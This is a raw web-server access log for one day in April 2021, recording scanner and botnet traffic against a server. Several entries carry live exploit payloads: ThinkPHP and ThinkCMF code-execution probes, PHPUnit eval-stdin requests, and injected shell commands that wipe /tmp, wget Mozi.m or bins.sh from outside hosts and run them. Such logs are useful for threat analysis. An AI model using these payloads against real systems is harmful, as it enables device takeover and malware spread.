45.32.235.175 - - [18/Apr/2021:00:18:43 +0800] "GET /mysql/web/index.php?lang=en HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
45.32.235.175 - - [18/Apr/2021:00:18:43 +0800] "GET /db/myadmin/index.php?lang=en HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
193.46.255.97 - - [18/Apr/2021:00:20:15 +0800] "HEAD /robots.txt HTTP/1.0" 502 0 "-" "-"
45.155.205.211 - - [18/Apr/2021:00:57:54 +0800] "POST /api/jsonws/invoke HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.211 - - [18/Apr/2021:00:57:55 +0800] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.211 - - [18/Apr/2021:00:57:55 +0800] "GET /solr/admin/info/system?wt=json HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.211 - - [18/Apr/2021:00:57:55 +0800] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.211 - - [18/Apr/2021:00:57:55 +0800] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.211 - - [18/Apr/2021:00:57:55 +0800] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.211 - - [18/Apr/2021:00:57:56 +0800] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.211 - - [18/Apr/2021:00:57:56 +0800] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.211 - - [18/Apr/2021:00:57:56 +0800] "GET /console/ HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.211 - - [18/Apr/2021:00:57:57 +0800] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.211 - - [18/Apr/2021:00:57:57 +0800] "GET /_ignition/execute-solution HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
221.15.52.59 - - [18/Apr/2021:01:02:10 +0800] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 157 "-" "-"
59.55.155.145 - - [18/Apr/2021:01:38:29 +0800] "GET / HTTP/1.1" 502 3693 "-" "Apache-HttpClient/4.5.6 (Java/1.8.0_112)"
60.191.125.35 - - [18/Apr/2021:02:01:28 +0800] "HEAD http://112.124.42.80:63435/ HTTP/1.1" 502 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
114.67.176.212 - - [18/Apr/2021:03:17:06 +0800] "GET /phpmyadmin/index.php HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3464.0 Safari/537.36"
114.67.176.212 - - [18/Apr/2021:03:17:06 +0800] "GET /pmd/index.php HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3464.0 Safari/537.36"
114.67.176.212 - - [18/Apr/2021:03:17:06 +0800] "GET /phpmyadmin4.8.5/index.php HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3464.0 Safari/537.36"
205.185.122.102 - - [18/Apr/2021:03:21:48 +0800] "GET /config/getuser?index=0 HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
193.46.255.97 - - [18/Apr/2021:03:45:49 +0800] "HEAD /robots.txt HTTP/1.0" 502 0 "-" "-"
182.254.52.17 - - [18/Apr/2021:03:50:50 +0800] "GET http://121.5.231.59/sqlmanager/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
101.89.19.140 - - [18/Apr/2021:04:35:15 +0800] "GET http://121.5.231.59/ HTTP/1.1" 400 233 "-" "-"
118.126.124.141 - - [18/Apr/2021:04:35:15 +0800] "GET / HTTP/1.1" 502 3693 "-" "Go-http-client/1.1"
47.195.235.87 - - [18/Apr/2021:05:25:11 +0800] "GET /phpmyadmin2014/index.php?lang=en HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
183.192.179.16 - - [18/Apr/2021:05:29:44 +0800] "GET http://121.5.231.59/db/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
36.78.192.146 - - [18/Apr/2021:06:28:19 +0800] "GET / HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
101.89.19.140 - - [18/Apr/2021:06:41:58 +0800] "GET http://121.5.231.59/sql/phpmanager/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
118.126.124.74 - - [18/Apr/2021:06:41:58 +0800] "GET /sql/phpmanager/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Go-http-client/1.1"
45.85.90.147 - - [18/Apr/2021:06:48:07 +0800] "GET / HTTP/1.1" 502 3693 "-" "Linux Gnu (cow)"
86.49.97.56 - - [18/Apr/2021:07:23:35 +0800] "GET / HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
45.85.90.147 - - [18/Apr/2021:07:39:03 +0800] "GET / HTTP/1.1" 502 3693 "-" "Linux Gnu (cow)"
45.132.95.75 - - [18/Apr/2021:07:50:59 +0800] "GET / HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
209.141.45.200 - - [18/Apr/2021:08:07:56 +0800] "GET /config/getuser?index=0 HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
59.45.26.66 - - [18/Apr/2021:08:27:49 +0800] "POST /invoker/readonly HTTP/1.1" 502 3693 "http://121.5.231.59:80/invoker/readonly" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
45.229.55.8 - - [18/Apr/2021:08:58:49 +0800] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://45.229.55.86:54843/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 502 3693 "-" "-"
205.185.122.102 - - [18/Apr/2021:09:00:31 +0800] "GET /config/getuser?index=0 HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
159.146.60.213 - - [18/Apr/2021:09:00:49 +0800] "GET /shell?cd+/tmp;rm+-rf+*;wget+ http://45.85.90.131/bins.sh;chmod+777+/tmp/bins.sh;sh+/tmp/bins.sh HTTP/1.1" 502 3693 "-" "Hello, world"
180.149.125.165 - - [18/Apr/2021:09:35:21 +0800] "GET /c/ HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
101.89.19.140 - - [18/Apr/2021:10:23:37 +0800] "GET http://121.5.231.59/db/dbadmin/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
118.126.124.198 - - [18/Apr/2021:10:23:37 +0800] "GET /db/dbadmin/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Go-http-client/1.1"
213.21.48.29 - - [18/Apr/2021:11:18:09 +0800] "GET / HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
121.51.112.49 - - [18/Apr/2021:11:28:51 +0800] "GET http://121.5.231.59/sql/webadmin/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
118.126.124.7 - - [18/Apr/2021:11:28:51 +0800] "GET /sql/webadmin/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Go-http-client/1.1"
220.194.106.61 - - [18/Apr/2021:11:54:43 +0800] "GET http://121.5.231.59/phpmyadmin/ HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
118.126.124.198 - - [18/Apr/2021:11:54:43 +0800] "GET /phpmyadmin/ HTTP/1.1" 502 3693 "-" "Go-http-client/1.1"
220.194.106.61 - - [18/Apr/2021:11:55:25 +0800] "GET http://121.5.231.59/db/myadmin/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
59.36.132.240 - - [18/Apr/2021:12:49:37 +0800] "GET http://121.5.231.59/phpmy/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
118.126.124.172 - - [18/Apr/2021:12:49:37 +0800] "GET /phpmy/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Go-http-client/1.1"
45.85.90.147 - - [18/Apr/2021:13:03:37 +0800] "GET / HTTP/1.1" 502 3693 "-" "Linux Gnu (cow)"
66.240.205.34 - - [18/Apr/2021:13:11:09 +0800] "H\x00\x00\x00tj\xA8\x9E#D\x98+\xCA\xF0\xA7\xBBl\xC5\x19\xD7\x8D\xB6\x18\xEDJ\x1En\xC1\xF9xu[l\xF0E\x1D-j\xEC\xD4xL\xC9r\xC9\x15\x10u\xE0%\x86Rtg\x05fv\x86]%\xCC\x80\x0C\xE8\xCF\xAE\x00\xB5\xC0f\xC8\x8DD\xC5\x09\xF4" 400 157 "-" "-"
121.51.112.49 - - [18/Apr/2021:13:25:40 +0800] "GET http://121.5.231.59/administrator/PMA/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
66.79.124.18 - - [18/Apr/2021:13:26:43 +0800] "GET / HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
61.241.50.63 - - [18/Apr/2021:13:32:52 +0800] "GET http://121.5.231.59/administrator/admin/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
183.192.179.16 - - [18/Apr/2021:13:57:19 +0800] "GET http://121.5.231.59/pma2016/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
101.89.19.140 - - [18/Apr/2021:13:57:52 +0800] "GET http://121.5.231.59/PMA/index.php?lang%3Den HTTP/1.1" 400 233 "-" "-"
182.73.163.98 - - [18/Apr/2021:14:41:01 +0800] "POST /_ignition/execute-solution HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
182.73.163.98 - - [18/Apr/2021:14:41:01 +0800] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
182.73.163.98 - - [18/Apr/2021:14:41:02 +0800] "GET / HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
182.73.163.98 - - [18/Apr/2021:14:41:03 +0800] "GET /login HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
182.73.163.98 - - [18/Apr/2021:14:41:03 +0800] "GET /jenkins/login HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
182.73.163.98 - 8hYTSUFk [18/Apr/2021:14:41:05 +0800] "GET /manager/html HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
182.73.163.98 - - [18/Apr/2021:14:41:05 +0800] "GET /wp-login.php HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
182.73.163.98 - - [18/Apr/2021:14:41:06 +0800] "GET /?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=__HelloThinkPHP HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0) Gecko/20100101 Firefox/78.0"
116.128.128.41 - - [18/Apr/2021:15:03:06 +0800] "GET http://121.5.231.59/phpmyadmin3/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
101.89.19.140 - - [18/Apr/2021:15:06:47 +0800] "GET http://121.5.231.59/phpmy-admin/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
118.126.124.7 - - [18/Apr/2021:15:06:47 +0800] "GET /phpmy-admin/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Go-http-client/1.1"
101.89.19.140 - - [18/Apr/2021:15:07:34 +0800] "GET http://121.5.231.59/phpmyadmin1/index.php?lang%3Den HTTP/1.1" 400 233 "-" "-"
118.126.124.7 - - [18/Apr/2021:15:07:34 +0800] "GET /phpmyadmin1/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Go-http-client/1.1"
184.105.247.195 - - [18/Apr/2021:15:21:02 +0800] "GET / HTTP/1.1" 502 3693 "-" "-"
116.128.128.41 - - [18/Apr/2021:15:21:57 +0800] "GET http://121.5.231.59/phpMyadmin/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
101.89.19.140 - - [18/Apr/2021:15:30:15 +0800] "GET http://121.5.231.59/pma2020/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
118.126.124.7 - - [18/Apr/2021:15:30:15 +0800] "GET /pma2020/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Go-http-client/1.1"
169.239.3.43 - - [18/Apr/2021:15:36:45 +0800] "GET / HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
220.194.106.61 - - [18/Apr/2021:15:39:45 +0800] "GET http://121.5.231.59/sql/websql/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
118.126.124.7 - - [18/Apr/2021:15:39:45 +0800] "GET /sql/websql/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Go-http-client/1.1"
45.85.90.147 - - [18/Apr/2021:16:19:42 +0800] "GET / HTTP/1.1" 502 3693 "-" "Linux Gnu (cow)"
182.254.52.17 - - [18/Apr/2021:16:20:56 +0800] "GET http://121.5.231.59/mysql-admin/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
118.126.124.172 - - [18/Apr/2021:16:20:56 +0800] "GET /mysql-admin/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Go-http-client/1.1"
182.254.52.17 - - [18/Apr/2021:16:42:57 +0800] "GET http://121.5.231.59/phpmyadmin/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
118.126.124.7 - - [18/Apr/2021:16:42:57 +0800] "GET /phpmyadmin/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Go-http-client/1.1"
192.241.220.40 - - [18/Apr/2021:16:55:22 +0800] "GET /portal/redlion HTTP/1.1" 502 3693 "-" "Mozilla/5.0 zgrab/0.x"
192.241.218.240 - - [18/Apr/2021:17:17:21 +0800] "GET /actuator/health HTTP/1.1" 502 3693 "-" "Mozilla/5.0 zgrab/0.x"
209.141.54.139 - - [18/Apr/2021:17:21:26 +0800] "GET /index.html HTTP/1.1" 502 3693 "-" "Mozilla/5.0"
46.241.120.165 - - [18/Apr/2021:17:35:15 +0800] "GET / HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
64.77.244.130 - - [18/Apr/2021:17:59:02 +0800] "GET /.env HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.77.244.130 - - [18/Apr/2021:17:59:03 +0800] "POST / HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
116.128.128.41 - - [18/Apr/2021:18:01:29 +0800] "GET http://121.5.231.59/db/webadmin/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
220.194.106.61 - - [18/Apr/2021:18:16:24 +0800] "GET http://121.5.231.59/db/dbweb/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
118.126.124.74 - - [18/Apr/2021:18:16:24 +0800] "GET /db/dbweb/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Go-http-client/1.1"
192.241.214.99 - - [18/Apr/2021:18:27:51 +0800] "GET /hudson HTTP/1.1" 502 3693 "-" "Mozilla/5.0 zgrab/0.x"
220.194.106.61 - - [18/Apr/2021:18:33:33 +0800] "GET http://121.5.231.59/phpmyadmin2014/index.php?lang%3Den HTTP/1.1" 400 233 "-" "-"
118.126.124.172 - - [18/Apr/2021:18:33:33 +0800] "GET /phpmyadmin2014/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Go-http-client/1.1"
182.254.52.17 - - [18/Apr/2021:19:13:18 +0800] "GET http://121.5.231.59/mysql/dbadmin/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
118.126.124.172 - - [18/Apr/2021:19:13:18 +0800] "GET /mysql/dbadmin/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Go-http-client/1.1"
220.194.106.61 - - [18/Apr/2021:19:14:39 +0800] "GET http://121.5.231.59/mysql/pma/index.php?lang%3Den HTTP/1.1" 400 233 "-" "-"
118.126.124.7 - - [18/Apr/2021:19:14:39 +0800] "GET /mysql/pma/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Go-http-client/1.1"
121.51.112.49 - - [18/Apr/2021:19:25:07 +0800] "GET http://121.5.231.59/mysqladmin/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
139.162.88.63 - - [18/Apr/2021:19:30:48 +0800] "GET http://clientapi.ipip.net/echo.php?info=1234567890 HTTP/1.1" 502 3693 "-" "Go-http-client/1.1"
45.144.225.96 - - [18/Apr/2021:19:36:51 +0800] "GET / HTTP/1.1" 502 3693 "-" "Linux Gnu (cow)"
138.117.176.121 - - [18/Apr/2021:19:47:48 +0800] "GET / HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
45.155.205.211 - - [18/Apr/2021:19:53:18 +0800] "POST /api/jsonws/invoke HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.211 - - [18/Apr/2021:19:53:19 +0800] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.211 - - [18/Apr/2021:19:53:19 +0800] "GET /solr/admin/info/system?wt=json HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.211 - - [18/Apr/2021:19:53:19 +0800] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.211 - - [18/Apr/2021:19:53:19 +0800] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.211 - - [18/Apr/2021:19:53:19 +0800] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.211 - - [18/Apr/2021:19:53:20 +0800] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.211 - - [18/Apr/2021:19:53:20 +0800] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.211 - - [18/Apr/2021:19:53:20 +0800] "GET /_ignition/execute-solution HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.211 - - [18/Apr/2021:19:53:21 +0800] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.211 - - [18/Apr/2021:19:53:21 +0800] "GET /console/ HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
82.40.134.178 - - [18/Apr/2021:19:56:43 +0800] "GET / HTTP/1.1" 502 3693 "-" "-"
45.85.90.147 - - [18/Apr/2021:20:12:19 +0800] "GET / HTTP/1.1" 502 3693 "-" "Linux Gnu (cow)"
182.254.52.17 - - [18/Apr/2021:20:16:34 +0800] "GET http://121.5.231.59/pma2011/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
118.126.124.7 - - [18/Apr/2021:20:16:35 +0800] "GET /pma2011/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Go-http-client/1.1"
116.128.128.41 - - [18/Apr/2021:20:31:42 +0800] "GET http://121.5.231.59/sql/webdb/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
101.89.19.140 - - [18/Apr/2021:21:00:21 +0800] "GET http://121.5.231.59/pma2012/index.php?lang%3Den HTTP/1.1" 400 233 "-" "-"
188.166.167.7 - - [18/Apr/2021:22:11:06 +0800] "GET / HTTP/1.0" 502 3693 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0"
182.254.52.17 - - [18/Apr/2021:22:21:40 +0800] "GET http://121.5.231.59/PMA2021/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
118.126.124.141 - - [18/Apr/2021:22:21:40 +0800] "GET /PMA2021/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Go-http-client/1.1"
101.89.19.140 - - [18/Apr/2021:22:30:03 +0800] "GET http://121.5.231.59/PMA2020/index.php?lang%3Den HTTP/1.1" 400 233 "-" "-"
220.194.106.61 - - [18/Apr/2021:22:35:29 +0800] "GET http://121.5.231.59/wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
182.254.52.17 - - [18/Apr/2021:22:36:13 +0800] "GET http://121.5.231.59/program/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
118.126.124.198 - - [18/Apr/2021:22:36:13 +0800] "GET /program/index.php?lang%3Den HTTP/1.1" 502 3693 "-" "Go-http-client/1.1"
192.241.214.19 - - [18/Apr/2021:22:46:43 +0800] "GET / HTTP/1.1" 502 3693 "-" "Mozilla/5.0 zgrab/0.x"
192.140.39.209 - - [18/Apr/2021:23:05:17 +0800] "GET / HTTP/1.1" 502 3693 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
